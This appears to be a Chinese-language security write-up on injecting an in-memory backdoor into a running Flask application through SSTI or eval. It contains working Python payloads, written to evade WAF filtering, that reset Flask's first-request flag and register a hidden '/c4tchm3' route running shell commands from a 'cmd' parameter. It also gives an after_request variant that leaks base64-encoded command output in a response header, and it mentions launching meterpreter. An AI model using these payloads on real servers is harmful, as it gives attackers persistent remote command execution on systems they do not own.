# 介绍
	- 内存马是一种通过攻击正在运行的服务器后端，通过添加恶意的路由向其添加新的后门的技术。因为后门
- # 前人的工作
	- 网上流传着这么一个技巧：使用app实例中的`add_url_rule`可以向app中动态添加路由
	- 有人给出了[SSTI的payload](https://github.com/jweny/MemShellDemo/blob/master/MemShellForPython/python%20flask%20%E5%86%85%E5%AD%98%E9%A9%AC.md)完成这个操作，但是存在以下问题
		- payload被写在了ssti的payload中，无法动态地绕过WAF
		- 过于依赖flask内部机制，在最新版flask中已经不能用payload中的方式找到app实例
		- 添加路由的方式已经过时，新版flask提示：
			- ```
			  AssertionError: The setup method 'add_url_rule' can no longer be called on the application. It has already handled its first request, any changes will not be applied consistently.
			  Make sure all imports, decorators, functions, etc. needed to set up the application are done before running it.
			  ```
- # 新思路
	- 翻找flask的代码，发现app实例中有一个endpoint函数，其职责是注册动态路由的函数。其会将路由函数放入`self.view_functions`中，代码如下：
		- ```python
		  def decorator(f: F) -> F:
		      self.view_functions[endpoint] = f
		      return f
		  
		  return decorator
		  ```
	- `self.view_functions`的注释给出了使用例，用于注册新的路由。
		- ```python
		  app.add_url_rule("/ex", endpoint="example")
		  ```
	- 我们可以将新的函数放进`view_functions`中，然后调用`app.add_url_rule`动态添加内存马
	- `app.add_url_rule`这个函数被装饰器`@setupmethod`装饰，我们需要修改`app._got_first_request`为False，让其以为第一个请求还没有到来才能继续添加新的路由
		- ```python
		  app.__dict__.update({'_got_first_request':False})
		  ```
	- 为了动态地绕过SSTI WAF, 我们通过sys模块而不是jinja变量找到app实例：`sys.modules["__main__"].app`
	- 而且为了减少对全局变量的依赖，这里仅仅使用一个全局变量完成所有操作：使用builtins中的`__import__`函数
	- 然后完成上方的两个操作即可，payload如下：
		- ```python
		  [
		      app.view_functions
		      for app in [ __import__('sys').modules["__main__"].app ]
		      for c4tchm3 in [
		          lambda : __import__('os').popen(__import__('__main__').app.jinja_env.globals["request"].args.get("cmd", "id")).read()
		      ]
		      if [
		          app.__dict__.update({'_got_first_request':False}),
		          app.view_functions.__setitem__('c4tchm3', c4tchm3),
		          app.add_url_rule("/c4tchm3", endpoint="c4tchm3")
		      ]
		  ]
		  ```
	- 紧凑版payload
		- ```python
		  [ app.view_functions for app in [ __import__('sys').modules["__main__"].app ] for c4tchm3 in [ lambda : __import__('os').popen(__import__('__main__').app.jinja_env.globals["request"].args.get("cmd", "id")).read() ] if [ app.__dict__.update({'_got_first_request':False}), app.view_functions.__setitem__('c4tchm3', c4tchm3), app.add_url_rule("/c4tchm3", endpoint="c4tchm3") ] ] 
		  ```
	- 使用方式
		- 想办法把payload丢给eval执行即可，对SSTI来说应该很简单
		- 然后访问路由：`/c4tchm3?cmd=whoami`
- # 通过header进行回显
	- ```python
	  [
	      app.view_functions
	      for app in [ __import__('sys').modules["__main__"].app ]
	      for c4tchm3 in [
	          lambda resp: [
	              resp
	              for cmd_result in [__import__('os').popen(__import__('__main__').app.jinja_env.globals["request"].args.get("cmd", "id")).read()]
	              if [
	                  resp.headers.__setitem__("Aaa", __import__("base64").b64encode(cmd_result.encode()).decode()),
	                  print(resp.headers["Aaa"])
	              ]
	          ][0]
	      ]
	      if [
	          app.__dict__.update({'_got_first_request':False}),
	          app.after_request_funcs.setdefault(None, []).append(c4tchm3)
	      ]
	  ]
	  ```
- # 其他思路？
	- 其实如果可以eval的话，也可以直接用eval上线meterpreter的
	- 但是这就要出网了
-